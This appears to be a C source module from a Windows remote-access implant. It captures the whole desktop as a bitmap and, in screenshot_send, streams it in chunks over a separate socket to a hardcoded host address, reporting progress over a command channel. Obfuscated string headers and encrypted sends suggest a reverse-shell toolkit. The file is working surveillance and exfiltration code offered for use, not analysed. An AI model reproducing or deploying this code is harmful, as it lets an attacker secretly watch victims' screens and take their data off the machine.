#include <stdio.h>
#include <time.h>
#include <ws2tcpip.h>
#include <windows.h>

#include "main.h"
#include "cry_socket.h"

#include "shell_obf.h"

// req: -lgdi32
int screenshot(const char* path) {
	
	char name[MAX_PATH] = {0};
	if (path == NULL) {
		#ifdef _WIN64
			snprintf(name, MAX_PATH, "%lld.bmp", time(0));
		#else
			snprintf(name, MAX_PATH, "%ld.bmp", time(0));
		#endif
	}
	else { snprintf(name, MAX_PATH, "%s", path); }
	
    BITMAPFILEHEADER bfHeader;
    BITMAPINFOHEADER biHeader;
    BITMAPINFO bInfo;
    HGDIOBJ hTempBitmap;
    HBITMAP hBitmap;
    BITMAP bAllDesktops;
    HDC hDC, hMemDC;
    LONG lWidth, lHeight;
    BYTE* bBits = NULL;
    DWORD cbBits, dwWritten = 0;
    HANDLE hFile;
    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);

    ZeroMemory(&bfHeader,     sizeof(BITMAPFILEHEADER));
    ZeroMemory(&biHeader,     sizeof(BITMAPINFOHEADER));
    ZeroMemory(&bInfo,        sizeof(BITMAPINFO));
    ZeroMemory(&bAllDesktops, sizeof(BITMAP));

    hDC = GetDC(NULL);
    hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
    GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);

    lWidth = bAllDesktops.bmWidth;
    lHeight = bAllDesktops.bmHeight;

    DeleteObject(hTempBitmap);

    bfHeader.bfType = (WORD)('B' | ('M' << 8));
    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    biHeader.biSize = sizeof(BITMAPINFOHEADER);
    biHeader.biBitCount = 24;
    biHeader.biCompression = BI_RGB;
    biHeader.biPlanes = 1;
    biHeader.biWidth = lWidth;
    biHeader.biHeight = lHeight;

    bInfo.bmiHeader = biHeader;

    cbBits = (((24 * lWidth + 31)&~31) / 8) * lHeight;

    hMemDC = CreateCompatibleDC(hDC);
    hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID **)&bBits, NULL, 0);
    SelectObject(hMemDC, hBitmap);
    BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);
	
    hFile = CreateFile(name, GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) { return 0; }
    WriteFile(hFile, &bfHeader, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
    WriteFile(hFile, &biHeader, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);
    WriteFile(hFile, bBits, cbBits, &dwWritten, NULL);

    CloseHandle(hFile);

    DeleteDC(hMemDC);
    ReleaseDC(NULL, hDC);
    DeleteObject(hBitmap);

    return 1;
}

int screenshot_send(SOCKET mainCallback) {
	
    BITMAPFILEHEADER bfHeader;
    BITMAPINFOHEADER biHeader;
    BITMAPINFO bInfo;
    BITMAP bAllDesktops;
    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);

    ZeroMemory(&bfHeader,     sizeof(BITMAPFILEHEADER));
    ZeroMemory(&biHeader,     sizeof(BITMAPINFOHEADER));
    ZeroMemory(&bInfo,        sizeof(BITMAPINFO));
    ZeroMemory(&bAllDesktops, sizeof(BITMAP));

    HDC hDC = GetDC(NULL);
    HGDIOBJ hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
    GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);

    LONG lWidth = bAllDesktops.bmWidth;
    LONG lHeight = bAllDesktops.bmHeight;

    DeleteObject(hTempBitmap);

    bfHeader.bfType = (WORD)('B' | ('M' << 8));
    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    biHeader.biSize = sizeof(BITMAPINFOHEADER);
    biHeader.biBitCount = 24;
    biHeader.biCompression = BI_RGB;
    biHeader.biPlanes = 1;
    biHeader.biWidth = lWidth;
    biHeader.biHeight = lHeight;

    bInfo.bmiHeader = biHeader;

    DWORD cbBits = (((24 * lWidth + 31)&~31) / 8) * lHeight;

    HDC hMemDC = CreateCompatibleDC(hDC);
    BYTE* bBits = NULL;
    HBITMAP hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID**)&bBits, NULL, 0);
    SelectObject(hMemDC, hBitmap);
    BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);
	
    /*
    HANDLE hFile = CreateFile("new.bmp", GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) { return 0; }
    DWORD dwWritten = 0;
    WriteFile(hFile, &bfHeader, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
    WriteFile(hFile, &biHeader, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);
    WriteFile(hFile, bBits, cbBits, &dwWritten, NULL);
    CloseHandle(hFile);
    //*/

    // send conn msg
	sendE(mainCallback, SHELL_STRING_SENDRECV_MSG_CONNECT, strlen(SHELL_STRING_SENDRECV_MSG_CONNECT), 0);
	
	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET) {
		sendE(mainCallback, SHELL_STRING_SENDRECV_ERROR_SOCKET, strlen(SHELL_STRING_SENDRECV_ERROR_SOCKET), 0);
		closesocket(sock);
		return 0;
	}
	
	struct sockaddr_in addr;
	memset(&addr, 0, sizeof(addr)); // can use ZeroMemory
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(SHELL_STRING_HOST_IP);
	addr.sin_port = htons(HOST_PORT_SENDRECV);
	
	if (connect(sock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
		sendE(mainCallback, SHELL_STRING_SENDRECV_ERROR_CONNECT, strlen(SHELL_STRING_SENDRECV_ERROR_CONNECT), 0);
		closesocket(sock);
		return 0;
	}
	
    sendE(mainCallback, SHELL_STRING_SENDRECV_MSG_SENDING, strlen(SHELL_STRING_SENDRECV_MSG_SENDING), 0);

    // send screenshot
    DPL("SENDING BMP");
    DWORD total_sent = 0;

    DPL("SENDING bfHeader");
    int bfh = sizeof(BITMAPFILEHEADER);
    total_sent += bfh;
    sendE(sock, (const char*)&bfHeader, bfh, 0);

    DPL("SENDING biHeader");
    int bih = sizeof(BITMAPINFOHEADER);
    total_sent += bih;
    sendE(sock, (const char*)&biHeader, bih, 0);

    // send buffer in chunks
    DPL("SENDING bBits");
    char* ptr = (char*)bBits;
    DWORD size = KSIZ;
    DWORD sent = 0;
    DWORD total = cbBits;
    D(printf("[DEBUG] total: %ld\n", total));
    while (sent < total) {

        if ((sent+size) > total) { size /= 2; continue; }
        sendE(sock, ptr, size, 0);

        total_sent += size;
        sent += size;
        ptr += size;

        /* PRINT INFO
        char msg[SMALLSIZ] = {0};
		sprintf(msg, "\rsent: %ld", total_sent);
		sendE(mainCallback, msg, strlen(msg), 0);
        D(printf("[DEBUG ] sent: %ld ; size: %ld ; total: %ld\n", sent, size, total));
        //*/
    }
    /* PRINT INFO
    char msg[] = "\n";
	sendE(mainCallback, msg, strlen(msg), 0);
    //*/

    DPL("SENT BMP");

	closesocket(sock);

    DPL("CLEANUP");

    DeleteDC(hMemDC);
    ReleaseDC(NULL, hDC);
    DeleteObject(hBitmap);

    sendE(mainCallback, SHELL_STRING_SENDRECV_MSG_COMPLETED, strlen(SHELL_STRING_SENDRECV_MSG_COMPLETED), 0);

    return 1;
}